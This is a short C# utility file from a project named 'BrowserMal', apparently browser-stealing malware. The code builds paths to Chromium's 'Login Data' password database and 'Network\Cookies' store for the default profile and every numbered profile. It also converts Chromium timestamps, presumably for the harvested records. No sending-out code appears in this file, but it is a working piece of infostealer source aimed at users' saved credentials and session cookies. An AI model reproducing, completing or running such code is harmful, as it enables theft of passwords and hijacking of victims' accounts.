﻿using System;
using System.Collections.Generic;
using System.IO;

namespace BrowserMal.Browser
{
    public class Util
    {
		public static readonly string LOGIN_DATA = "\\Login Data";
		public static readonly string COOKIES = "\\Network\\Cookies";

		public static List<string> GetAllProfiles(string DirectoryPath, string pathType)
		{
			List<string> list = new List<string>
			{
				DirectoryPath + "\\Default" + pathType,
				DirectoryPath + pathType
			};

			if (Directory.Exists(DirectoryPath))
			{
				foreach (string profile in Directory.GetDirectories(DirectoryPath))
				{
					if (profile.Contains("Profile"))
					{
						list.Add(profile + pathType);
					}
				}
			}

			return list;
		}

		public static string ChromiumToUnixTimestamp(long chromiumTimestamp)
        {
			DateTime dateChromium = new DateTime(1601, 1, 1);
			DateTime dateUnix = new DateTime(1970, 1, 1);

			TimeSpan difference = dateUnix.Subtract(dateChromium);
			double resolvedTimestamp = (chromiumTimestamp / 1000000) - difference.TotalSeconds;

			return resolvedTimestamp.ToString();
		}

		public static DateTime GetDateTimeFromTimestamp(string timestamp)
        {
			return DateTimeOffset.FromUnixTimeSeconds(Convert.ToInt64(timestamp)).DateTime;
		}

	}
}
